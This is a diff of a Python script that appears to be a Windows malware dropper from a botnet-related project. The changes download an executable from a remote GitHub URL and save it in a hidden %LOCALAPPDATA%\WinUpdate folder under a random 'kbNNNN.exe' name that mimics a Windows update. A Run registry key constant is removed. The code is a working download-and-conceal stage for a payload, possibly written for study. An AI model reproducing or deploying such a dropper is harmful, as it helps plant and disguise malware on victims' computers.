@@ -17,11 +17,11 @@ try:
 except ImportError:
     # this has been renamed in python 3
     import winreg
-from urllib.request import urlopen, urlretrieve
+from urllib.request import urlopen
 from urllib.error import URLError
+from random import randint
 
-KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
-PAYLOAD_URL = r"https://raw.githubusercontent.com/notclement/iobdug_malware_py/master/harmless"
+PAYLOAD_URL = r"https://github.com/notclement/botnet-enumeration-network/raw/master/resources/payload.exe"
 GOOGLE_DNS = 'http://www.google.com'
 PATH_TO_HIDE = "{}\\WinUpdate".format(os.getenv('LOCALAPPDATA'))
 
@@ -61,10 +61,13 @@ def do_checks():
         return 1
 
 
-def get_payload_to_path(url, path_to_hide):
+def get_payload_to_path(payload_url, path_to_hide):
     """Reaches out to github to retrieve the payload"""
-    print(path_to_hide)
-    urlretrieve(url, path_to_hide)
+    full_path_to_hide = path_to_hide+"\\kb{}.exe".format(randint(1000000000,9999999999))
+    print(full_path_to_hide)
+    with urlopen(payload_url) as download_data, open(full_path_to_hide, 'wb') as exefile:
+        data = download_data.read()
+        exefile.write(data)
 
 
 def main():
